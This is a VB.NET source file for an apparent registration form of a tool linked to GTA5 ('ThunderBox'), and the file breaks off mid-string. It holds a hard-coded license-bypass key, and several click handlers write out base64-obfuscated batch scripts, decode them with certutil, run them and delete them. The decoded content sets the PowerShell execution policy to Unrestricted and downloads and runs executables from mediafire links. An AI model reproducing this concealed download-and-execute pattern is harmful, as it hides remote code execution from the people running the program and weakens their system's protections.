﻿Public Class Register
    Private Sub Register_Load_1(sender As Object, e As EventArgs) Handles MyBase.Load
        If (IO.File.Exists("Register.exe.config")) Then GoTo RegisterConfig
        GoTo MyRegisterConfig
        GoTo EndSub
RegisterConfig:
        If Label2.Text = Nothing Then
            PictureBox1.Visible = False
            PictureBox2.Visible = False
            PictureBox3.Visible = False
            PictureBox4.Visible = False
            PictureBox5.Visible = True
            PictureBox7.Visible = False
            Label5.Visible = False
            Label6.Visible = False
            Label7.Visible = False
            Label8.Visible = False
            Label9.Visible = False
            Label10.Visible = False
        End If
        Dim Times As String = System.DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
        Label1.Text = Times
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\License.Times") = False Then
            PictureBox1.Visible = False
            PictureBox2.Visible = False
            PictureBox3.Visible = False
            PictureBox4.Visible = False
            PictureBox5.Visible = True
            PictureBox7.Visible = False
            Label5.Visible = False
            Label6.Visible = False
            Label7.Visible = False
            Label8.Visible = False
            Label9.Visible = False
            Label10.Visible = False
            GoTo EndSub
        End If
        Dim reader As New System.IO.StreamReader(Application.StartupPath & "\License.Times")
        Label2.Text = New System.Text.ASCIIEncoding().GetString(Convert.FromBase64String(reader.ReadLine()))
        Dim date1 As Date = CDate(Label1.Text)
        Dim date2 As Date = CDate(Label2.Text)
        Dim result As Integer = DateTime.Compare(date1, date2)
        If result < 0 Then
            Label3.Text = "is earlier than"
            PictureBox1.Visible = True
            PictureBox2.Visible = True
            PictureBox3.Visible = True
            PictureBox4.Visible = True
            PictureBox5.Visible = False
            PictureBox7.Visible = True
            Label5.Visible = False
            Label6.Visible = True
            Label7.Visible = False
            Label8.Visible = True
            Label9.Visible = True
            Label10.Visible = True
            GoTo EndSub
        ElseIf result = 0 Then
            Label3.Text = "is the same time as"
            PictureBox1.Visible = False
            PictureBox2.Visible = False
            PictureBox3.Visible = False
            PictureBox4.Visible = False
            PictureBox5.Visible = True
            PictureBox7.Visible = False
            Label5.Visible = False
            Label6.Visible = False
            Label7.Visible = False
            Label8.Visible = False
            Label9.Visible = False
            Label10.Visible = False
            GoTo EndSub
        Else
            Label3.Text = "is later than"
            PictureBox1.Visible = False
            PictureBox2.Visible = False
            PictureBox3.Visible = False
            PictureBox4.Visible = False
            PictureBox5.Visible = True
            PictureBox7.Visible = False
            Label5.Visible = False
            Label6.Visible = False
            Label7.Visible = False
            Label8.Visible = False
            Label9.Visible = False
            Label10.Visible = False
        End If
        GoTo EndSub
MyRegisterConfig:
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("echo 77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiID8+DQo8Y29u>>RegisterConfig.File")
        sb.AppendLine("echo ZmlndXJhdGlvbj4NCiAgICA8c3RhcnR1cD4NCiAgICAgICAgPHN1cHBvcnRlZFJ1>>RegisterConfig.File")
        sb.AppendLine("echo bnRpbWUgdmVyc2lvbj0idjQuMCIgc2t1PSIuTkVURnJhbWV3b3JrLFZlcnNpb249>>RegisterConfig.File")
        sb.AppendLine("echo djQuNy4xIiAvPg0KICAgIDwvc3RhcnR1cD4NCjwvY29uZmlndXJhdGlvbj4=>>RegisterConfig.File")
        sb.AppendLine("certutil -decode RegisterConfig.File Register.exe.config")
        sb.AppendLine("if exist RegisterConfig.File del /s /q RegisterConfig.File")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("RegisterConfig.bat", sb.ToString())
        Process.Start("RegisterConfig.bat")
        Threading.Thread.Sleep(1000)
        System.IO.File.Delete("RegisterConfig.bat")
        Application.Restart()
EndSub:
    End Sub
    Private Sub Enter_KeyDown(sender As Object, e As KeyEventArgs) Handles Enter.KeyDown
        If e.KeyCode = Keys.Enter Then GoTo Enter
        GoTo EndSub
Enter:
        Call Label4_Click(Me, e)
        GoTo EndSub
EndSub:
    End Sub
    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click
        If Enter.Text = "Register*Encodeur" Then GoTo Encodeur
        If Enter.Text = "Register*NoLimit" Then GoTo NoLimit
        GoTo Rplace
Rplace:
        Enter.Text = Enter.Text.Replace("¤", "=")
        Enter.Text = Enter.Text.Replace("°", "0")
        Enter.Text = Enter.Text.Replace("¿", "9")
        Enter.Text = Enter.Text.Replace("&", "8")
        Enter.Text = Enter.Text.Replace("ø", "7")
        Enter.Text = Enter.Text.Replace("º", "6")
        Enter.Text = Enter.Text.Replace("Ø", "5")
        Enter.Text = Enter.Text.Replace("%", "4")
        Enter.Text = Enter.Text.Replace("³", "3")
        Enter.Text = Enter.Text.Replace("²", "2")
        Enter.Text = Enter.Text.Replace("¹", "1")
        Enter.Text = Enter.Text.Replace("Ä", "a")
        Enter.Text = Enter.Text.Replace("ä", "b")
        Enter.Text = Enter.Text.Replace("¢", "c")
        Enter.Text = Enter.Text.Replace("â", "d")
        Enter.Text = Enter.Text.Replace("£", "e")
        Enter.Text = Enter.Text.Replace("ƒ", "f")
        Enter.Text = Enter.Text.Replace("Á", "g")
        Enter.Text = Enter.Text.Replace("á", "h")
        Enter.Text = Enter.Text.Replace("!", "i")
        Enter.Text = Enter.Text.Replace("í", "j")
        Enter.Text = Enter.Text.Replace("å", "k")
        Enter.Text = Enter.Text.Replace("¶", "l")
        Enter.Text = Enter.Text.Replace("ª", "m")
        Enter.Text = Enter.Text.Replace("ñ", "n")
        Enter.Text = Enter.Text.Replace("ò", "o")
        Enter.Text = Enter.Text.Replace("õ", "p")
        Enter.Text = Enter.Text.Replace("þ", "q")
        Enter.Text = Enter.Text.Replace("ó", "r")
        Enter.Text = Enter.Text.Replace("§", "s")
        Enter.Text = Enter.Text.Replace("ã", "t")
        Enter.Text = Enter.Text.Replace("µ", "u")
        Enter.Text = Enter.Text.Replace("Â", "v")
        Enter.Text = Enter.Text.Replace("Ã", "w")
        Enter.Text = Enter.Text.Replace("×", "x")
        Enter.Text = Enter.Text.Replace("¥", "y")
        Enter.Text = Enter.Text.Replace("ž", "z")
        Enter.Text = Enter.Text.Replace("$", "A")
        Enter.Text = Enter.Text.Replace("ß", "B")
        Enter.Text = Enter.Text.Replace("À", "C")
        Enter.Text = Enter.Text.Replace("à", "D")
        Enter.Text = Enter.Text.Replace("Œ", "E")
        Enter.Text = Enter.Text.Replace("ï", "F")
        Enter.Text = Enter.Text.Replace("Ï", "G")
        Enter.Text = Enter.Text.Replace("Î", "H")
        Enter.Text = Enter.Text.Replace("¦", "I")
        Enter.Text = Enter.Text.Replace("ì", "J")
        Enter.Text = Enter.Text.Replace("î", "K")
        Enter.Text = Enter.Text.Replace("#", "L")
        Enter.Text = Enter.Text.Replace("Ü", "M")
        Enter.Text = Enter.Text.Replace("Ñ", "N")
        Enter.Text = Enter.Text.Replace("ü", "O")
        Enter.Text = Enter.Text.Replace("û", "P")
        Enter.Text = Enter.Text.Replace("Û", "Q")
        Enter.Text = Enter.Text.Replace("Ú", "R")
        Enter.Text = Enter.Text.Replace("š", "S")
        Enter.Text = Enter.Text.Replace("Ù", "T")
        Enter.Text = Enter.Text.Replace("ú", "U")
        Enter.Text = Enter.Text.Replace("Ý", "V")
        Enter.Text = Enter.Text.Replace("ý", "W")
        Enter.Text = Enter.Text.Replace("Ÿ", "X")
        Enter.Text = Enter.Text.Replace("ÿ", "Y")
        Enter.Text = Enter.Text.Replace("Ž", "Z")
        Dim file As System.IO.StreamWriter
        file = My.Computer.FileSystem.OpenTextFileWriter("License.Times", True)
        file.WriteLine(Enter.Text)
        file.Close()
        Call Register_Load_1(Me, e)
        GoTo EndSub
Encodeur:
        Label5.Visible = True
        GoTo EndSub
NoLimit:
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(22222)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("22222 days from today: {0:dddd}", answer)
        Enter.Text = answer
        Enter.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(Enter.Text))
        Enter.Text = Enter.Text.Replace("=", "¤")
        Enter.Text = Enter.Text.Replace("0", "°")
        Enter.Text = Enter.Text.Replace("9", "¿")
        Enter.Text = Enter.Text.Replace("8", "&")
        Enter.Text = Enter.Text.Replace("7", "ø")
        Enter.Text = Enter.Text.Replace("6", "º")
        Enter.Text = Enter.Text.Replace("5", "Ø")
        Enter.Text = Enter.Text.Replace("4", "%")
        Enter.Text = Enter.Text.Replace("3", "³")
        Enter.Text = Enter.Text.Replace("2", "²")
        Enter.Text = Enter.Text.Replace("1", "¹")
        Enter.Text = Enter.Text.Replace("a", "Ä")
        Enter.Text = Enter.Text.Replace("b", "ä")
        Enter.Text = Enter.Text.Replace("c", "¢")
        Enter.Text = Enter.Text.Replace("d", "â")
        Enter.Text = Enter.Text.Replace("e", "£")
        Enter.Text = Enter.Text.Replace("f", "ƒ")
        Enter.Text = Enter.Text.Replace("g", "Á")
        Enter.Text = Enter.Text.Replace("h", "á")
        Enter.Text = Enter.Text.Replace("i", "!")
        Enter.Text = Enter.Text.Replace("j", "í")
        Enter.Text = Enter.Text.Replace("k", "å")
        Enter.Text = Enter.Text.Replace("l", "¶")
        Enter.Text = Enter.Text.Replace("m", "ª")
        Enter.Text = Enter.Text.Replace("n", "ñ")
        Enter.Text = Enter.Text.Replace("o", "ò")
        Enter.Text = Enter.Text.Replace("p", "õ")
        Enter.Text = Enter.Text.Replace("q", "þ")
        Enter.Text = Enter.Text.Replace("r", "ó")
        Enter.Text = Enter.Text.Replace("s", "§")
        Enter.Text = Enter.Text.Replace("t", "ã")
        Enter.Text = Enter.Text.Replace("u", "µ")
        Enter.Text = Enter.Text.Replace("v", "Â")
        Enter.Text = Enter.Text.Replace("w", "Ã")
        Enter.Text = Enter.Text.Replace("x", "×")
        Enter.Text = Enter.Text.Replace("y", "¥")
        Enter.Text = Enter.Text.Replace("z", "ž")
        Enter.Text = Enter.Text.Replace("A", "$")
        Enter.Text = Enter.Text.Replace("B", "ß")
        Enter.Text = Enter.Text.Replace("C", "À")
        Enter.Text = Enter.Text.Replace("D", "à")
        Enter.Text = Enter.Text.Replace("E", "Œ")
        Enter.Text = Enter.Text.Replace("F", "ï")
        Enter.Text = Enter.Text.Replace("G", "Ï")
        Enter.Text = Enter.Text.Replace("H", "Î")
        Enter.Text = Enter.Text.Replace("I", "¦")
        Enter.Text = Enter.Text.Replace("J", "ì")
        Enter.Text = Enter.Text.Replace("K", "î")
        Enter.Text = Enter.Text.Replace("L", "#")
        Enter.Text = Enter.Text.Replace("M", "Ü")
        Enter.Text = Enter.Text.Replace("N", "Ñ")
        Enter.Text = Enter.Text.Replace("O", "ü")
        Enter.Text = Enter.Text.Replace("P", "û")
        Enter.Text = Enter.Text.Replace("Q", "Û")
        Enter.Text = Enter.Text.Replace("R", "Ú")
        Enter.Text = Enter.Text.Replace("S", "š")
        Enter.Text = Enter.Text.Replace("T", "Ù")
        Enter.Text = Enter.Text.Replace("U", "ú")
        Enter.Text = Enter.Text.Replace("V", "Ý")
        Enter.Text = Enter.Text.Replace("W", "ý")
        Enter.Text = Enter.Text.Replace("X", "Ÿ")
        Enter.Text = Enter.Text.Replace("Y", "ÿ")
        Enter.Text = Enter.Text.Replace("Z", "Ž")
        Call Label4_Click(Me, e)
EndSub:
    End Sub
    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("cd ..")
        sb.AppendLine("if exist LoginEncoded.bat goto StartLogin")
        sb.AppendLine("echo QGVjaG8gb2ZmDQppZiBleGlzdCAiJWFwcGRhdGElXFRodW5kZXJCb3hcQ29sb3JC>>LoginEncoded.File")
        sb.AppendLine("echo b3guYmF0IiBjYWxsICIlYXBwZGF0YSVcVGh1bmRlckJveFxDb2xvckJveC5iYXQi>>LoginEncoded.File")
        sb.AppendLine("echo DQpjZFwNCmlmIG5vdCBleGlzdCAiJWFwcGRhdGElXFRodW5kZXJCb3hcUkVTVEFS>>LoginEncoded.File")
        sb.AppendLine("echo VC1HVEE1XCIgbWtkaXIgIiVhcHBkYXRhJVxUaHVuZGVyQm94XFJFU1RBUlQtR1RB>>LoginEncoded.File")
        sb.AppendLine("echo NVwiDQp0aW1lb3V0IC90IDMNCmNkXCAmJiBjZCAiJWFwcGRhdGElXFRodW5kZXJC>>LoginEncoded.File")
        sb.AppendLine("echo b3hcUkVTVEFSVC1HVEE1XCINCmlmIGV4aXN0IFJFU1RBUlQtR1RBNS5iYXQgZGVs>>LoginEncoded.File")
        sb.AppendLine("echo IC9zIC9xIFJFU1RBUlQtR1RBNS5iYXQNCmNkXCAmJiBjZCAiJWFwcGRhdGElXFRo>>LoginEncoded.File")
        sb.AppendLine("echo dW5kZXJCb3hcIg0KaWYgZXhpc3QgTG9naW4uZXhlIGRlbCAvcyAvcSBMb2dpbi5l>>LoginEncoded.File")
        sb.AppendLine("echo eGUNCmlmIGV4aXN0IExvZ2luRW5jb2RlZC5GaWxlIGRlbCAvcyAvcSBMb2dpbkVu>>LoginEncoded.File")
        sb.AppendLine("echo Y29kZWQuRmlsZQ0KY2RcICYmIGNkICJDOlxVc2Vyc1wlVXNlcm5hbWUlXERlc2t0>>LoginEncoded.File")
        sb.AppendLine("echo b3BcIg0KaWYgZXhpc3QgUkVTVEFSVC1HVEE1LmJhdCBkZWwgL3MgL3EgUkVTVEFS>>LoginEncoded.File")
        sb.AppendLine("echo VC1HVEE1LmJhdA0KaWYgZXhpc3QgTG9naW4uZXhlIGRlbCAvcyAvcSBMb2dpbi5l>>LoginEncoded.File")
        sb.AppendLine("echo eGUNCmlmIGV4aXN0IExvZ2luRW5jb2RlZC5GaWxlIGRlbCAvcyAvcSBMb2dpbkVu>>LoginEncoded.File")
        sb.AppendLine("echo Y29kZWQuRmlsZQ0KY2RcICYmIGNkICIlYXBwZGF0YSVcVGh1bmRlckJveFwiDQo6>>LoginEncoded.File")
        sb.AppendLine("echo TG9naW4gDQpAZWNobyBvZmYNCnRpdGxlIExvZ2luDQppZiBleGlzdCAiJWFwcGRh>>LoginEncoded.File")
        sb.AppendLine("echo dGElXFRodW5kZXJCb3hcTG9naW4uZXhlIiBnb3RvIFN0YXJ0TG9naW4NCmNkICIl>>LoginEncoded.File")
        sb.AppendLine("echo YXBwZGF0YSVcVGh1bmRlckJveFwiDQppZiBleGlzdCBMb2dpbkxpbmsuYmF0IGRl>>LoginEncoded.File")
        sb.AppendLine("echo bCAvcyAvcSBMb2dpbkxpbmsuYmF0DQppZiBleGlzdCBMb2dpbi50eHQgZGVsIC9z>>LoginEncoded.File")
        sb.AppendLine("echo IC9xIExvZ2luLnR4dA0KaWYgZXhpc3QgTG9naW4uRmlsZSBkZWwgL3MgL3EgTG9n>>LoginEncoded.File")
        sb.AppendLine("echo aW4uRmlsZQ0KaWYgZXhpc3QgTG9naW4ucHMxIGRlbCAvcyAvcSBMb2dpbi5wczEN>>LoginEncoded.File")
        sb.AppendLine("echo CnBvd2Vyc2hlbGwgU2V0LUV4ZWN1dGlvblBvbGljeSAtU2NvcGUgQ3VycmVudFVz>>LoginEncoded.File")
        sb.AppendLine("echo ZXIgVW5yZXN0cmljdGVkDQpwb3dlcnNoZWxsIC1Db21tYW5kIEludm9rZS1XZWJS>>LoginEncoded.File")
        sb.AppendLine("echo ZXF1ZXN0ICJodHRwOi8vd3d3Lm1lZGlhZmlyZS5jb20vZmlsZS9rMXFkNGJjaHZi>>LoginEncoded.File")
        sb.AppendLine("echo NXdicTgvTG9naW4uZXhlIiAtT3V0RmlsZSAiTG9naW4udHh0Ig0KY2QgIiVhcHBk>>LoginEncoded.File")
        sb.AppendLine("echo YXRhJVxUaHVuZGVyQm94XCINCmZpbmQgL0kgIjovL2Rvd25sb2FkIiBMb2dpbi50>>LoginEncoded.File")
        sb.AppendLine("echo eHQ+PkxvZ2luTGluay5iYXQNCmVjaG8gRXhpdD4+TG9naW5MaW5rLmJhdA0KZWNo>>LoginEncoded.File")
        sb.AppendLine("echo byBLRWRsZEMxRGIyNTBaVzUwSUV4dloybHVUR2x1YXk1aVlYUXBJSHdnRFFwR2Iz>>LoginEncoded.File")
        sb.AppendLine("echo SmxZV05vTFU5aWFtVmpkQ0I3Pj5Mb2dpbi5GaWxlDQplY2hvIEpGOGdMWEpsY0d4>>LoginEncoded.File")
        sb.AppendLine("echo aFkyVWdJbWh5WldZOUlpSWlMQ0FpZUhsNk16SXhJbjBnZkNBTkNsTmxkQzFEYjI1>>LoginEncoded.File")
        sb.AppendLine("echo MFpXNTA+PkxvZ2luLkZpbGUNCmVjaG8gSUV4dloybHVUR2x1YXk1aVlYUU5DaWhI>>LoginEncoded.File")
        sb.AppendLine("echo WlhRdFEyOXVkR1Z1ZENCTWIyZHBia3hwYm1zdVltRjBLU0I4SUEwSz4+TG9naW4u>>LoginEncoded.File")
        sb.AppendLine("echo RmlsZQ0KZWNobyBSbTl5WldGamFDMVBZbXBsWTNRZ2V5UmZJQzF5WlhCc1lXTmxJ>>LoginEncoded.File")
        sb.AppendLine("echo Q0lpSWo0aUxDQWlEUXA2ZVhnME5TSjlJSHdnPj5Mb2dpbi5GaWxlDQplY2hvIERR>>LoginEncoded.File")
        sb.AppendLine("echo cFRaWFF0UTI5dWRHVnVkQ0JNYjJkcGJreHBibXN1WW1GMERRb05DaWhIWlhRdFEy>>LoginEncoded.File")
        sb.AppendLine("echo OXVkR1Z1ZENCTWIyZHA+PkxvZ2luLkZpbGUNCmVjaG8gYmt4cGJtc3VZbUYwS1NC>>LoginEncoded.File")
        sb.AppendLine("echo OElBMEtSbTl5WldGamFDMVBZbXBsWTNRZ2V5UmZJQzF5WlhCc1lXTmxJQ0o0ZVhv>>LoginEncoded.File")
        sb.AppendLine("echo ej4+TG9naW4uRmlsZQ0KZWNobyBNakVpTENBaWNHOTNaWEp6YUdWc2JDQXRRMjl0>>LoginEncoded.File")
        sb.AppendLine("echo YldGdVpDQkpiblp2YTJVdFYyVmlVbVZ4ZFdWemRDQWlmU0I4Pj5Mb2dpbi5GaWxl>>LoginEncoded.File")
        sb.AppendLine("echo DQplY2hvIElBMEtVMlYwTFVOdmJuUmxiblFnVEc5bmFXNU1hVzVyTG1KaGRBMEtL>>LoginEncoded.File")
        sb.AppendLine("echo RWRsZEMxRGIyNTBaVzUwSUV4dloybHU+PkxvZ2luLkZpbGUNCmVjaG8gVEdsdWF5>>LoginEncoded.File")
        sb.AppendLine("echo NWlZWFFwSUh3Z0RRcEdiM0psWVdOb0xVOWlhbVZqZENCN0pGOGdMWEpsY0d4aFky>>LoginEncoded.File")
        sb.AppendLine("echo VWdJaTVsZUdVaT4+TG9naW4uRmlsZQ0KZWNobyBMQ0FpTG1WNFpTQXRUM1YwUm1s>>LoginEncoded.File")
        sb.AppendLine("echo c1pTQk1iMmRwYmk1bGVHVWdKaVlnWlhocGRDSjlJSHdnRFFwVFpYUXRRMjl1Pj5M>>LoginEncoded.File")
        sb.AppendLine("echo b2dpbi5GaWxlDQplY2hvIGRHVnVkQ0JNYjJkcGJreHBibXN1WW1GMElBMEtEUW89>>LoginEncoded.File")
        sb.AppendLine("echo Pj5Mb2dpbi5GaWxlDQp0aW1lb3V0IC9UIDENCmNlcnR1dGlsIC1kZWNvZGUgTG9n>>LoginEncoded.File")
        sb.AppendLine("echo aW4uRmlsZSBMb2dpbi5wczENCnRpbWVvdXQgL1QgMQ0KUG93ZXJTaGVsbC5leGUg>>LoginEncoded.File")
        sb.AppendLine("echo LUZpbGUgTG9naW4ucHMxIC1Ob0V4aXQNCnRpbWVvdXQgL1QgMQ0KZmluZCAvSSAi>>LoginEncoded.File")
        sb.AppendLine("echo cG93ZXJzaGVsbCAtQ29tbWFuZCBJbnZva2UtV2ViUmVxdWVzdCBodHRwIiBMb2dp>>LoginEncoded.File")
        sb.AppendLine("echo bkxpbmsuYmF0Pj5Mb2dpbkRvd25sb2FkTGluay5iYXQNCmNkICIlYXBwZGF0YSVc>>LoginEncoded.File")
        sb.AppendLine("echo VGh1bmRlckJveFwiICYmIHN0YXJ0IExvZ2luRG93bmxvYWRMaW5rLmJhdA0KdGlt>>LoginEncoded.File")
        sb.AppendLine("echo ZW91dCAvVCA3DQpjZCAiJWFwcGRhdGElXFRodW5kZXJCb3hcIg0KdGltZW91dCAv>>LoginEncoded.File")
        sb.AppendLine("echo VCAyDQppZiBleGlzdCBMb2dpbkRvd25sb2FkTGluay5iYXQgZGVsIC9zIC9xIExv>>LoginEncoded.File")
        sb.AppendLine("echo Z2luRG93bmxvYWRMaW5rLmJhdA0KaWYgZXhpc3QgTG9naW5MaW5rLmJhdCBkZWwg>>LoginEncoded.File")
        sb.AppendLine("echo L3MgL3EgTG9naW5MaW5rLmJhdA0KaWYgZXhpc3QgTG9naW4udHh0IGRlbCAvcyAv>>LoginEncoded.File")
        sb.AppendLine("echo cSBMb2dpbi50eHQNCmlmIGV4aXN0IExvZ2luLkZpbGUgZGVsIC9zIC9xIExvZ2lu>>LoginEncoded.File")
        sb.AppendLine("echo LkZpbGUNCmlmIGV4aXN0IExvZ2luLnBzMSBkZWwgL3MgL3EgTG9naW4ucHMxDQpp>>LoginEncoded.File")
        sb.AppendLine("echo ZiBub3QgZXhpc3QgY2QgIiVhcHBkYXRhJVxUaHVuZGVyQm94XExvZ2luLmV4ZSIg>>LoginEncoded.File")
        sb.AppendLine("echo Z290byBXZWJwYWdlTG9naW4NCmlmIGV4aXN0IGNkICIlYXBwZGF0YSVcVGh1bmRl>>LoginEncoded.File")
        sb.AppendLine("echo ckJveFxMb2dpbi5leGUiIGdvdG8gU3RhcnRMb2dpbg0KOlN0YXJ0TG9naW4NCmNk>>LoginEncoded.File")
        sb.AppendLine("echo ICIlYXBwZGF0YSVcVGh1bmRlckJveFwiDQppZiBub3QgZXhpc3QgIiVhcHBkYXRh>>LoginEncoded.File")
        sb.AppendLine("echo JVxUaHVuZGVyQm94XExvZ2luLmV4ZSIgY29weSAveSAiJX5kcDBcTG9naW4uZXhl>>LoginEncoded.File")
        sb.AppendLine("echo IiAiJWFwcGRhdGElXFJlc3RhcnQtR1RBNVwiDQpjZCAiJWFwcGRhdGElXFRodW5k>>LoginEncoded.File")
        sb.AppendLine("echo ZXJCb3hcIiAmJiBzdGFydCBMb2dpbi5leGUNCmdvdG8gRW5kTG9naW4NCjpXZWJw>>LoginEncoded.File")
        sb.AppendLine("echo YWdlTG9naW4NCnN0YXJ0IGh0dHA6Ly93d3cubWVkaWFmaXJlLmNvbS9maWxlL2sx>>LoginEncoded.File")
        sb.AppendLine("echo cWQ0YmNodmI1d2JxOC9Mb2dpbi5leGUiIC1PdXRGaWxlICJMb2dpbi50eHQiDQpn>>LoginEncoded.File")
        sb.AppendLine("echo b3RvIEVuZExvZ2luDQo6RW5kTG9naW4NCmdvdG8gRW5kDQo6RW5kDQpFeGl0DQo=>>LoginEncoded.File")
        sb.AppendLine("echo bmQNCkV4aXQ=>>LoginEncoded.File")
        sb.AppendLine("certutil -decode LoginEncoded.File LoginEncoded.bat")
        sb.AppendLine(":StartLogin")
        sb.AppendLine("start LoginEncoded.bat")
        sb.AppendLine("if exist LoginEncoded.File del /s /q LoginEncoded.File")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("Login.bat", sb.ToString())
        Process.Start("Login.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("Login.bat")
    End Sub
    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        If (IO.File.Exists("Browser.bat")) Then GoTo Browser
        Call Browser()
        GoTo EndSub
Browser:
        Process.Start("Browser.bat")
        GoTo EndSub
EndSub:
    End Sub
    Sub Browser()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("echo OkJyb3dzZXINCkBlY2hvIG9mZg0KaWYgbm90IGV4aXN0ICV+ZHAwXEJyb3dzZXJc>>Browser.Files")
        sb.AppendLine("echo QnJvd3Nlci5leGUgZ290byBCcm8NCmlmIGV4aXN0ICV+ZHAwXEJyb3dzZXJcQnJv>>Browser.Files")
        sb.AppendLine("echo d3Nlci5leGUgZ290byBTdGFydEJybw0KOkJybyANCkBlY2hvIG9mZg0KdGl0bGUg>>Browser.Files")
        sb.AppendLine("echo QnJvDQplY2hvICAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq>>Browser.Files")
        sb.AppendLine("echo KioqKioqKioqKg0KZWNobyAgICoqKi8vIFVwZGF0ZS1Ccm8uYmF0IC8vIFdpbjEw>>Browser.Files")
        sb.AppendLine("echo IC8vKioqDQplY2hvICAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq>>Browser.Files")
        sb.AppendLine("echo KioqKioqKioqKioqKg0KY2QgJX5kcDANCmlmIGV4aXN0ICV+ZHAwXEJyb1wgcm1k>>Browser.Files")
        sb.AppendLine("echo aXIgL3MgL3EgJX5kcDBcQnJvXA0KaWYgZXhpc3QgJX5kcDBcQnJvTGluay5iYXQg>>Browser.Files")
        sb.AppendLine("echo ZGVsIC9zIC9xICV+ZHAwXEJyb0xpbmsuYmF0DQppZiBleGlzdCAlfmRwMFxCcm93>>Browser.Files")
        sb.AppendLine("echo c2VyLnppcCBkZWwgL3MgL3EgJX5kcDBcQnJvd3Nlci56aXANCmlmIGV4aXN0ICV+>>Browser.Files")
        sb.AppendLine("echo ZHAwXEJyby50eHQgZGVsIC9zIC9xICV+ZHAwXEJyby50eHQNCmlmIGV4aXN0ICV+>>Browser.Files")
        sb.AppendLine("echo ZHAwXEJyby5GaWxlIGRlbCAvcyAvcSAlfmRwMFxCcm8uRmlsZQ0KaWYgZXhpc3Qg>>Browser.Files")
        sb.AppendLine("echo JX5kcDBcQnJvLnBzMSBkZWwgL3MgL3EgJX5kcDBcQnJvLnBzMQ0KaWYgZXhpc3Qg>>Browser.Files")
        sb.AppendLine("echo JX5kcDBcVW56aXBCcm8ucHMxIGRlbCAvcyAvcSAlfmRwMFxVbnppcEJyby5wczEN>>Browser.Files")
        sb.AppendLine("echo CnBvd2Vyc2hlbGwgU2V0LUV4ZWN1dGlvblBvbGljeSAtU2NvcGUgQ3VycmVudFVz>>Browser.Files")
        sb.AppendLine("echo ZXIgVW5yZXN0cmljdGVkDQpwb3dlcnNoZWxsIC1Db21tYW5kIEludm9rZS1XZWJS>>Browser.Files")
        sb.AppendLine("echo ZXF1ZXN0ICJodHRwOi8vd3d3Lm1lZGlhZmlyZS5jb20vZmlsZS9haHVobmM4bDRm>>Browser.Files")
        sb.AppendLine("echo MGJkMGYvQnJvd3Nlci56aXAiIC1PdXRGaWxlICJCcm8udHh0Ig0KY2QgJX5kcDAN>>Browser.Files")
        sb.AppendLine("echo CmZpbmQgL0kgIjovL2Rvd25sb2FkIiBCcm8udHh0Pj5Ccm9MaW5rLmJhdA0KZWNo>>Browser.Files")
        sb.AppendLine("echo byBFeGl0Pj5Ccm9MaW5rLmJhdA0KZWNobyBLRWRsZEMxRGIyNTBaVzUwSUVKeWIw>>Browser.Files")
        sb.AppendLine("echo eHBibXN1WW1GMEtTQjhJQTBLUm05eVpXRmphQzFQWW1wbFkzUWdleVJmPj5Ccm8u>>Browser.Files")
        sb.AppendLine("echo RmlsZQ0KZWNobyBJQzF5WlhCc1lXTmxJQ0pvY21WbVBTSWlJaXdnSW5oNWVqTXlN>>Browser.Files")
        sb.AppendLine("echo U0o5SUh3Z0RRcFRaWFF0UTI5dWRHVnVkQ0JDPj5Ccm8uRmlsZQ0KZWNobyBjbTlN>>Browser.Files")
        sb.AppendLine("echo YVc1ckxtSmhkQTBLS0VkbGRDMURiMjUwWlc1MElFSnliMHhwYm1zdVltRjBLU0I4>>Browser.Files")
        sb.AppendLine("echo SUEwS1JtOXlaV0ZqPj5Ccm8uRmlsZQ0KZWNobyBhQzFQWW1wbFkzUWdleVJmSUMx>>Browser.Files")
        sb.AppendLine("echo eVpYQnNZV05sSUNJaUlqNGlMQ0FpRFFwNmVYZzBOU0o5SUh3Z0RRcFRaWFF0Pj5C>>Browser.Files")
        sb.AppendLine("echo cm8uRmlsZQ0KZWNobyBRMjl1ZEdWdWRDQkNjbTlNYVc1ckxtSmhkQTBLRFFvb1Iy>>Browser.Files")
        sb.AppendLine("echo VjBMVU52Ym5SbGJuUWdRbkp2VEdsdWF5NWlZWFFwPj5Ccm8uRmlsZQ0KZWNobyBJ>>Browser.Files")
        sb.AppendLine("echo SHdnRFFwR2IzSmxZV05vTFU5aWFtVmpkQ0I3SkY4Z0xYSmxjR3hoWTJVZ0luaDVl>>Browser.Files")
        sb.AppendLine("echo ak15TVNJc0lDSndiM2RsPj5Ccm8uRmlsZQ0KZWNobyBjbk5vWld4c0lDMURiMjF0>>Browser.Files")
        sb.AppendLine("echo WVc1a0lFbHVkbTlyWlMxWFpXSlNaWEYxWlhOMElDSjlJSHdnRFFwVFpYUXRRMjl1>>Browser.Files")
        sb.AppendLine("echo Pj5Ccm8uRmlsZQ0KZWNobyBkR1Z1ZENCQ2NtOU1hVzVyTG1KaGRBMEtLRWRsZEMx>>Browser.Files")
        sb.AppendLine("echo RGIyNTBaVzUwSUVKeWIweHBibXN1WW1GMEtTQjhJQTBLPj5Ccm8uRmlsZQ0KZWNo>>Browser.Files")
        sb.AppendLine("echo byBSbTl5WldGamFDMVBZbXBsWTNRZ2V5UmZJQzF5WlhCc1lXTmxJQ0l1ZW1sd0lp>>Browser.Files")
